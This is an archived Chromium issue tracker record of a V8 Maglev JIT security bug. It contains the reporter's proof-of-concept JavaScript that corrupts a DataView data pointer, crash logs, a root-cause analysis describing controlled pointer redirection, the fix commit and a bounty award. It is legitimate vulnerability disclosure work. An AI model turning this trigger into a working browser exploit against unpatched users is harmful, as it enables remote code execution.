# Security: SEGV_ACCERR 000044332211 in V8

| Field | Value |
|-------|-------|
| **Issue ID** | [460678755](https://issues.chromium.org/issues/460678755) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | ma...@chromium.org |
| **Created** | 2025-11-14 |
| **Bounty** | $8,000.00 |

## Description

## Bisect

- Version: 103665
- Commit: 42309b501c1cd91d832ccb7514ac59d0682d76d3
- Link: <https://crrev.com/42309b501c1cd91d832ccb7514ac59d0682d76d3>

```
commit 42309b501c1cd91d832ccb7514ac59d0682d76d3
Author: Marja Hölttä <marja@chromium.org>
Date:   Tue Nov 11 16:59:47 2025 +0100

    [maglev] Cache the DataView's data pointer for element access
    
    This way we don't need to read the data pointer multiple times if we
    access several elements.
    
    Bug: 431933185
    Change-Id: Ief07064b07ef208cbbd6119ecb490141df77ede3
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7141782
    Commit-Queue: Marja Hölttä <marja@chromium.org>
    Reviewed-by: Victor Gomes <victorgomes@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#103665}

```
## Reproduction

1. Download: `gs://v8-asan/linux-debug/d8-linux-debug-v8-component-103665.zip`
2. Run: `d8 --allow-natives-syntax --no-maglev-untagged-phis poc.js`

## Crash Output

```
----------------------------------------
--------------------------------------------------------------------------------
Received signal 11 SEGV_ACCERR 000044332211

==== C stack trace ===============================

/home/sakura/v8/v8/out/fuzzbuild/d8(+0xc2c076)[0x55e90cce3076]
/lib/x86_64-linux-gnu/libc.so.6(+0x42520)[0x7fa485a42520]
[0x55e9719e26cf]
[end of stack trace]
Segmentation fault



================================================================================
----------------------------------------

```
## PoC

```
function g0(obj, name, type) {}
function g1(obj, type) {
  let properties = [];
  return properties;
}
{
  g4 = function (obj, seed) {};
}
(function () {
  g7 = function (timeout, inline) {};
})();
var v0 = 0;
function fn1(v2) {
  if (!v2) throw new Error();
}
function fn8() {
  function fn15(v38, v39) {
    let v40 = v38.getInt32(0, v39);
    let v41 = v38.getInt32(0, !v38);
    return [v40, v41];
  }
  let v36 = new ArrayBuffer(8);
  let v37 = new DataView(v36);
  v37.setInt32(0, 0x11223344, true);
  for (let v42 = 0; v42 < 40000; ++v42) {
    let v43 = fn15(v37, true);
    fn1(v43[0] === 0x11223344);
    fn1(v43[1] === 0x44332211);
  }
}
fn8();
// Flags: --allow-natives-syntax --no-maglev-untagged-phis

```

## Timeline

### cl...@appspot.gserviceaccount.com (2025-11-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6657450354606080.

### an...@chromium.org (2025-11-14)

[security shepherd]: Thanks for the report! Assigning to current sheriff and setting tentative severity to S1.

### je...@gmail.com (2025-11-15)

Please run ClusterFuzz with the flags

### ch...@google.com (2025-11-15)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-11-15)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### ch...@google.com (2025-11-15)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### je...@gmail.com (2025-11-16)

## Root Cause

This bug was introduced by commit 42309b501c1cd91d832ccb7514ac59d0682d76d3, which added a DataView data-pointer caching optimization. During Maglev graph construction, a reusable `LoadDataViewDataPointer` node is emitted for the same `JSDataView`, and later DataView reads/writes share that cached pointer. The problem sits in the code generator for integer DataView reads (`LoadSignedIntDataViewElement`): when the result register is allocated to the same register as the `is_little_endian` input, the generator overwrites the data-pointer input register with the loaded value, corrupting the register that previously held the data pointer. Because the data pointer is cached and reused, subsequent DataView accesses keep using the poisoned register as the new pointer, enabling controlled pointer redirection. With `--no-maglev-untagged-phis` enabled, register allocation more readily hits this corruption path; the crash at address `0x44332211` reflects the first read value being reused as a pointer.

### ch...@google.com (2025-11-17)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ma...@chromium.org (2025-11-18)

Thanks for the bug report and analysis. The bug is exactly where the report says it is.

The offending CL landed 3 days before the report was filed and this will likely be taken into account when deciding whether it's eligible for VRP.

### je...@gmail.com (2025-11-18)

> Reports for security bugs introduced in newly landed code on trunk / head within the last 48 hours are not eligible for VRP rewards.
> <https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules>

I remember it was 48 hours? So it should be okay? Moreover, if ClusterFuzzer didn't find it, then I just submitted it a bit earlier instead of waiting. I don't want to be ineligible for the VRP reward because of this; that would be really bad.

### ma...@chromium.org (2025-11-18)

(Edited the previous comment to make the statement more accurate.)

### je...@gmail.com (2025-11-18)

Moreover, I think this vulnerability should be able to lead to RCE, and I also want to write an exploit for it after you confirm whether it is a duplicate and deserves a VRP reward :) I believe this is a good bug worthy of VRP as long as it hasn't been discovered by ClusterFuzz.

### ma...@chromium.org (2025-11-18)

I might not have the most up to date infos here, let's wait for VRP to tune in! I'm not removing any labels here, so this bug will be processed when it's fixed (soon).

### ma...@google.com (2025-11-18)

Re comment 2: Looks like the Clusterfuzz upload was made without the arguments from the issue description, hence no repro.

### ma...@google.com (2025-11-18)

@bikineev (security shepherd): Could you try to upload to CF again with the args?

### dx...@google.com (2025-11-18)

Project: v8/v8  

Branch:  main  

Author:  Marja Hölttä [marja@chromium.org](mailto:marja@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7167248>

[maglev] Fix a bug in DataView data ptr caching

---


Expand for full commit details
```
     
    Fixed: 460678755 
    Change-Id: Idda11b4d5f2b04071be5f9d18c1a2a9582233d7e 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7167248 
    Commit-Queue: Marja Hölttä <marja@chromium.org> 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#103776}

```

---

Files:

- M `src/maglev/maglev-ir.cc`
- A `test/mjsunit/maglev/regress-460678755.js`

---

Hash: [ed91aeae48553c05c5ac82f0512cddd9f04d6c60](https://chromiumdash.appspot.com/commit/ed91aeae48553c05c5ac82f0512cddd9f04d6c60)  

Date: Tue Nov 18 10:45:36 2025


---

### cl...@appspot.gserviceaccount.com (2025-11-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4903073117831168.

### ma...@google.com (2025-11-18)

Re comment 16: Nvm, just hit re-upload.

### 24...@project.gserviceaccount.com (2025-11-18)

Detailed Report: https://clusterfuzz.com/testcase?key=4903073117831168

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x000044332211
Crash State:
  v8::internal::Invoke
  v8::internal::Execution::CallScript
  v8::Script::Run
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=103775

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4903073117831168

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### aj...@google.com (2025-11-18)

Eligibility for VRP rewards is determined once an issue is Fixed and the issue has reached the panel. We cannot discuss eligibility before this.

If an issue receives a reward feel free to let us know you'd like to work on an exploit - we can increase the reward if you come up with an exploit in a reasonably short time frame.

### ch...@google.com (2025-11-19)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M143. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: M143 has already been cut for stable release.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [143].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ya...@chromium.org (2025-11-21)

marja@ Please take a look at the merge request questionnaire. Thanks!

### ma...@chromium.org (2025-11-24)

The buggy CL <https://chromiumdash.appspot.com/commit/42309b501c1cd91d832ccb7514ac59d0682d76d3> is not in M143. Unfortunately, the bot cannot figure this out for V8 CLs and ends up pinging them.

### je...@gmail.com (2025-12-08)

Hello, this vulnerability has been fixed for two weeks, and I have been waiting for your decision to determine whether to write an exploit for it. Please let me know when the Chrome Vulnerability Reward Program will issue the reward. Thank you. Best regards.

### sp...@google.com (2025-12-08)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Renderer RCE / memory corruption in a sandboxed process with a bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### je...@gmail.com (2025-12-09)

Thanks to Chrome VRP, I'll start working on the exploit.

### ch...@google.com (2026-02-25)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> Renderer RCE / memory corruption in a sandboxed process with a bisect bonus

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/460678755)*
